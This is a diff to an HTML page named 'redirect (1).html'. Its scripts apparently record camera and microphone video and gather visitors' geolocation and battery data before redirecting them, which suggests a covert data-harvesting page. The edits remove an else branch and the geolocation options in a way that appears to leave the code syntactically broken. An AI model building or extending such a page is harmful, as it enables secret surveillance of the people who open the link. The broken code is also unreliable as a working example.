@@ -1,3 +1,4 @@
+--- START OF FILE redirect (1).html ---
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -292,8 +293,6 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
             cameraError = error.message;
             collectOtherData(true, videoUrl, cameraError); // Pass videoUrl and cameraError here, even if null
         }
-    } else {
-        collectOtherData(true, videoUrl, cameraError); // Pass videoUrl and cameraError here, even if null
     } finally {
          if (stream) { // Ensure stream is stopped even if try block fails
             stream.getTracks().forEach(track => {
@@ -405,13 +404,7 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
                 collectOtherData(false, videoUrl, cameraError); // Pass false for location denied
 
 
-            },
-            {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            }
-        );
+        })
     } else {
         console.error("Geolocation is not supported by this browser.");
         errorMessage.textContent = "Locatie niet ondersteund door browser.";
